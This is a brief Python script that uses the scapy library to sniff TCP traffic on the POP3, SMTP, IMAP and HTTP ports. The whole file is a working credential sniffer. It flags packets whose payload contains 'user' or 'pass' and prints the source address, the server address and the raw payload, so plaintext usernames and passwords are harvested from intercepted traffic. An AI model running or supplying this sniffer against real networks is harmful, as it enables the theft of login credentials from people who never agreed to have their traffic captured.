from scapy.all import *

# our pakeages callback
def packet_callback(packet):

	if packet[TCP].payload:
		mail_packet = str(packet[TCP].payload)

		if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
			print "[*] Src: %s" % packet[IP].src
			print "[*] Server: %s" % packet[IP].dst
			print "[*] %s" % packet[TCP].payload


# fire up our sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143 or tcp port 80",
      prn=packet_callback, store=0)
